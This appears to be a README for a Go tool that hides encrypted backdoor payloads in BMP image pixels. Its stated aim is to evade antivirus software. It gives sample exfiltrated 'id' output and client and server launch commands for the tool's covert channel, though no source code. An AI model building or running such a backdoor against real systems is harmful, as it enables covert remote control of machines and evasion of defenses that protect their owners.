# Go-BMP-Backdoor

Inspired by [Transferring Backdoor Payloads with BMP Image Pixels](https://www.peerlyst.com/posts/transferring-backdoor-payloads-with-bmp-image-pixels-damon-mohammadbagher), I write a Go version.

Encrypt backdoor payloads in .bmp files to bypass AV.

## Example

![](./client_send.bmp)

base64 encoded `uid=1000(amyang) gid=1000(amyang) groups=1000(amyang),10(wheel),14(uucp),54(lock),56(bumblebee),95(storage),108(vboxusers),1001(usbfs)`

## Usage

### Client

`./client_linux -server 127.0.0.1 -port 1337`

so is client_windows.exe

### Server

`./server -port 1337`